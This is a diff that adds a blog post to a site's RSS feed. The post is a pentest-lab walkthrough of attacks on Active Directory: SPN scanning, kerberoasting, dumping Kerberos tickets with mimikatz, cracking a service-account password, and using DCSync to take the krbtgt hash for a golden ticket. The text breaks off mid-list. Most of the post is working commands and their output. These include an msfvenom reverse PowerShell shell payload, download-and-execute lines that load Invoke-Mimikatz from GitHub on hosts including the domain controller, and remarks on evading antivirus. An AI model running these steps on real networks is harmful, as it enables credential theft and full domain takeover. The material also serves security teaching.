@@ -6,8 +6,507 @@
     <description>Recent content in Posts on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 30 Sep 2015 19:39:55 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 09 Jan 2016 10:12:09 +0200</lastBuildDate>
     <atom:link href="https://leonjza.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>kerberos, kerberoast and golden tickets</title>
+      <link>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</link>
+      <pubDate>Sat, 09 Jan 2016 10:12:09 +0200</pubDate>
+      
+      <guid>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</guid>
+      <description>
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?&lt;/p&gt;
+
+&lt;p&gt;The reality is, &lt;em&gt;many&lt;/em&gt; times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of &lt;code&gt;lsass&lt;/code&gt; and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to &lt;a href=&#34;https://github.com/sensepost/autoDANE&#34;&gt;automate&lt;/a&gt; this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!&lt;/p&gt;
+
+&lt;p&gt;This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!&lt;/p&gt;
+
+&lt;h2 id=&#34;lets-set-the-scene:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;lets set the scene&lt;/h2&gt;
+
+&lt;p&gt;Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into AD. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_(protocol)&#34;&gt;https://en.wikipedia.org/wiki/Kerberos_(protocol)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&#34;&gt;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2362&#34;&gt;https://adsecurity.org/?p=2362&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the &lt;em&gt;foo.local&lt;/em&gt; domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &amp;lsquo;attacker&amp;rsquo; on the same subnet as all of these Windows computers.&lt;/p&gt;
+
+&lt;p&gt;One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.&lt;/p&gt;
+
+&lt;h1 id=&#34;spn-scanning-the-setup:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the setup&lt;/h1&gt;
+
+&lt;p&gt;One of the avenues we can pursue now is to query Active Directory for objects that have a &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&#34;&gt;Service Principal Name&lt;/a&gt; set.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&amp;rsquo;s in my lab are running an instance of &lt;a href=&#34;https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx&#34;&gt;SQL Server 2014 Express&lt;/a&gt;, configured to run with the &lt;code&gt;svcSQLServ&lt;/code&gt; domain service account.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;On my domain controller, I configured the SPN&amp;rsquo;s with the following commands:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
+Checking domain DC=foo,DC=local
+
+Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
+        svcSQLServ/pc1.foo.local:1433
+Updated object
+
+PS C:\&amp;gt; setspn -A svcSQLServ/pc2.foo.local:1433 foo\svcSQLServ
+Checking domain DC=foo,DC=local
+
+Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
+        svcSQLServ/pc2.foo.local:1433
+Updated object
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;spn-scanning-the-offensive-perspective:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the offensive perspective&lt;/h2&gt;
+
+&lt;p&gt;Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a &lt;em&gt;free port scan&lt;/em&gt; done too. You will see in a moment. =]&lt;/p&gt;
+
+&lt;p&gt;Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. The gist of it is this LDAP search &lt;code&gt;(&amp;amp;(objectcategory=user)(serviceprincipalname=*))&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn &lt;code&gt;powershell.exe&lt;/code&gt; from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.&lt;/p&gt;
+
+&lt;h3 id=&#34;setup-a-powershell-connection:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;setup a powershell connection&lt;/h3&gt;
+
+&lt;p&gt;We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the &lt;code&gt;exec_powershell&lt;/code&gt; post module. In a new terminal, run &lt;code&gt;msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1727 bytes
+���`��1�d�P0�R
+�8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
+                      K�XӋ�ЉD$$[[aYZQ��__Z���]j���Ph1�o��ջ���Vh������&amp;lt;|
+���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#39;H4sIABX0kF ... snip ... AAA=&#39;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from &lt;code&gt;IEX&lt;/code&gt; all the way to &lt;code&gt;ReadToEnd();)&lt;/code&gt; and paste that in a new file (I used &lt;code&gt;/root/power-shell.ps1&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;Now, back at your metasploit session, background the meterpreter session and setup a new &lt;code&gt;exploit/multi/handler&lt;/code&gt; for the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. When you issue the &lt;code&gt;exploit&lt;/code&gt; command, add &lt;code&gt;-j&lt;/code&gt; so that the job will run in the background. We have one more thing to do before it will connect back.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with &lt;code&gt;msfvenom&lt;/code&gt;! Use the &lt;code&gt;exec_powershell&lt;/code&gt; post module and configure it to pickup the script where ever you placed it on disk:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we can &lt;code&gt;run&lt;/code&gt; this module and hope it works!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;blockquote&gt;
+&lt;p&gt;Powershell session session 3 opened&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ok, that was a lot of work, but now we have the environment we need to get in with the SPN scanning! Simply interact with the session that spawned.&lt;/p&gt;
+
+&lt;p&gt;The next thing we want to do is get the &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; PowerShell function into the environment. The script lives &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. Thankfully, we can kind of &lt;em&gt;include&lt;/em&gt; functions into the current session by using the powershell &lt;code&gt;Invoke-Expression&lt;/code&gt; cmdlet. To do that we run:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. We can now just run the method!!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;We have just discovered the service account &lt;code&gt;svcSQLServ&lt;/code&gt; and 2 hosts there it is in use!
+The script also accepts a few arguments, such as &lt;code&gt;-DumpSPN&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPN
+Discovering service account SPNs in the AD Domain foo.local
+svcSQLServ/pc1.foo.local:1433
+svcSQLServ/pc2.foo.local:1433
+PS C:\Users\bobs\Downloads&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the part where I remind you about the &lt;em&gt;free port scan&lt;/em&gt; I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just an LDAP query. Highly doubt that will trigger many monitoring tools out there!&lt;/p&gt;
+
+&lt;h2 id=&#34;kerberos-service-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;kerberos service tickets&lt;/h2&gt;
+
+&lt;p&gt;We now have 2 SPN&amp;rsquo;s that we managed to query off the domain. &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; &amp;amp; &lt;code&gt;svcSQLServ/pc2.foo.local:1433&lt;/code&gt;. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;This is where you need to pay attention.&lt;/em&gt; The service ticket is encrypted using the secret key (&lt;em&gt;read, &amp;lsquo;password&amp;rsquo;&lt;/em&gt;) of the account used in the SPN (&lt;code&gt;svcSQLServ&lt;/code&gt; in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&amp;hellip; Note, the server hosting the service will still validate the ticket itself (99% without rechecking with the Kerberos server btw).&lt;/p&gt;
+
+&lt;p&gt;What does that mean for an attacker? Well, we can request the service ticket&amp;hellip; and&amp;hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.&lt;/p&gt;
+
+&lt;h2 id=&#34;enter-kerberoast:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;enter kerberoast&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt; is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&amp;rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the &lt;code&gt;tgsrepcrack.py&lt;/code&gt; script to crack against a wordlist.&lt;/p&gt;
+
+&lt;p&gt;All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; (from the &lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;PowerSploit Repository&lt;/a&gt;). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;)
+PS C:\&amp;gt; Invoke-Mimikatz
+
+  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &#39;#####&#39;                                     with 17 modules * * */
+
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+mimikatz(powershell) # exit
+Bye!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just running &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; might not be entirely opsec safe as, by default, it will run the &lt;code&gt;sekurlsa::logonpasswords&lt;/code&gt; command (which may trigger some monitoring). You may have also noticed the &lt;code&gt;LOAD_MODULES&lt;/code&gt; setting in the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. Here we can actually give it the URL&amp;rsquo;s we are going to load with &lt;code&gt;Invoke-Expression&lt;/code&gt; and metasploit will download and prep that for you! :)&lt;/p&gt;
+
+&lt;p&gt;Anyways, lets check the current cached kerberos tickets that we have for this session.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::list&amp;quot;&#39;
+
+  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &#39;#####&#39;                                     with 17 modules * * */
+
+
+mimikatz(powershell) # kerberos::list
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like there are no cached Kerberos tickets for this session. This can also be checking by running the &lt;code&gt;klist&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; klist
+
+Current LogonId is 0:0x3fde2
+
+Cached Tickets: (0)
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you had tickets here, you can purge them from memory by running &lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;&lt;/code&gt;.
+Lets request a service ticket for the &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; SPN (The command syntax can be seen in the Kerberoast repository):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;svcSQLServ/pc1.foo.local:1433&amp;quot;
+
+
+Id                   : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 1/9/2016 7:29:11 PM
+ValidTo              : 1/10/2016 5:29:11 AM
+ServicePrincipalName : svcSQLServ/pc1.foo.local:1433
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you wanted to tickets for all the possible SPN&amp;rsquo;s, we could have run the below that will loop over the results from &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; and request a ticket for each:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, if we recheck the tickets we have for this session, we can see that we have one for &lt;code&gt;svcSQLServ&lt;/code&gt;:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_spn.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;dumping-kerberos-tickets-from-memory:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;dumping kerberos tickets from memory&lt;/h2&gt;
+
+&lt;p&gt;Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;&lt;code&gt;1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi&lt;/code&gt; is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D&lt;/p&gt;
+
+&lt;h2 id=&#34;cracking-the-kerberos-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;cracking the kerberos ticket&lt;/h2&gt;
+
+&lt;p&gt;Back at my meterpreter session, we can simply download the ticket locally, and start the crack. &lt;code&gt;tgsrepcrack.py&lt;/code&gt; allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.&lt;/p&gt;
+
+&lt;p&gt;So download the ticket&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;meterpreter &amp;gt; cd downloads/kerb
+meterpreter &amp;gt; ls
+Listing: C:\users\bobs\downloads\kerb
+=====================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  1260  fil   2016-01-09 14:35:09 -0500  0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi
+100666/rw-rw-rw-  1364  fil   2016-01-09 14:35:09 -0500  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+
+meterpreter &amp;gt; download Interrupt: use the &#39;exit&#39; command to quit
+meterpreter &amp;gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
+[*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+[*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;hellip; and crack it!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+All tickets cracked!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;Password1&lt;/code&gt; is the password for the &lt;code&gt;svcSQLServ&lt;/code&gt; account! \o/&lt;/p&gt;
+
+&lt;p&gt;One reason why having the password for this account is especially bad is because of its group memberships&amp;hellip; Yes, I know. You may not easily see this in real life, but just bear with me for now.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; net user svcSQLServ /domain
+The request will be processed at a domain controller for domain foo.local.
+
+User name                    svcSQLServ
+Full Name                    SQL Server
+Comment                      SQL Server Serice Account
+User&#39;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/7/2016 11:38:02 PM
+Password expires             Never
+Password changeable          1/8/2016 11:38:02 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/9/2016 10:33:41 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+The command completed successfully.
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;testing-the-credentials:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;testing the credentials&lt;/h2&gt;
+
+&lt;p&gt;For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.&lt;/p&gt;
+
+&lt;p&gt;We will start by configuring a credentials object, and then just run the &lt;code&gt;Get-Process&lt;/code&gt; cmdlet on the domain controller as proof.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
+Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With output&amp;hellip;&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&amp;hellip;&lt;/p&gt;
+
+&lt;h1 id=&#34;golden-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;golden tickets&lt;/h1&gt;
+
+&lt;p&gt;We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to &lt;code&gt;svcSQLServ&lt;/code&gt; changes? That would mean we lose access! One way we can prevent this is by creating a &lt;em&gt;golden ticket&lt;/em&gt; that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D&lt;/p&gt;
+
+&lt;p&gt;To create a golden ticket, we can use either the &lt;em&gt;kiwi&lt;/em&gt; extension in metasploit, or &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again! There are a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the &lt;code&gt;krbtgt&lt;/code&gt; user of the domain. Without that, this is not a viable persistence strategy.&lt;/p&gt;
+
+&lt;p&gt;The complete list of prerequisites are:
+- The Domains FQDN
+- The Domains SID
+- The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash
+- A username (fake or real, does not matter. Not fake if you need opsec ofc!)&lt;/p&gt;
+
+&lt;p&gt;Getting the FQDN and SID (&lt;code&gt;whoami /user&lt;/code&gt;) of the Domain should be relatively trivial. Remember to grab the SID without the &lt;a href=&#34;https://en.wikipedia.org/wiki/Security_Identifier&#34;&gt;trailing RID&lt;/a&gt;. So if the full SID is &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117-1104&lt;/code&gt; then you are only going to use &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Getting the NT Hash of the &lt;code&gt;krbtgt&lt;/code&gt; account though is something I want to show using a recent feature addition to mimikatz, &lt;a href=&#34;http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/&#34;&gt;DCSync&lt;/a&gt;. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. That means hash extraction from any PC on the domain (authenticated as a admin), but ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!&lt;/p&gt;
+
+&lt;p&gt;In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way &lt;code&gt;Enter-PSSession&lt;/code&gt; sets up the shell, I can&amp;rsquo;t seem to get an interactive shell as another user via metasploit going without using another exploit &amp;amp;&amp;amp; payload combination. So, we are just going to use &lt;code&gt;Invoke-Command&lt;/code&gt; with our commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; $creds
+
+UserName                       Password
+--------                       --------
+svcSQLServ System.Security.SecureString
+
+
+PS C:\&amp;gt; Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1
+svcSQLServ
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great so that works. To continue, we are going to have to run a few commands.
+- &lt;code&gt;Invoke-Expression&lt;/code&gt; to get mimikatz
+- Run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; and its required parameters
+- Dance!&lt;/p&gt;
+
+&lt;p&gt;I constructed my command that needed to be run on my PowerShell session and ended up with this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:krbtgt&amp;quot;&#39;} -Credential $creds -ComputerName dc1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let me try explain what is going on here. I am saying, &lt;code&gt;Invoke-Command&lt;/code&gt; on the computer &lt;code&gt;dc1&lt;/code&gt; as &lt;code&gt;svcSQLServ&lt;/code&gt; (stored in the &lt;code&gt;$creds&lt;/code&gt; variable) using PowerShell Remoting. The command to run is defined in the &lt;code&gt;ScriptBlock {}&lt;/code&gt; which is; download mimikatz; run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with the &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; command.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;We have the hash for &lt;code&gt;krbtgt&lt;/code&gt;! &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt; : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The Domains FQDN. &lt;code&gt;foo.local&lt;/code&gt;&lt;/li&gt;
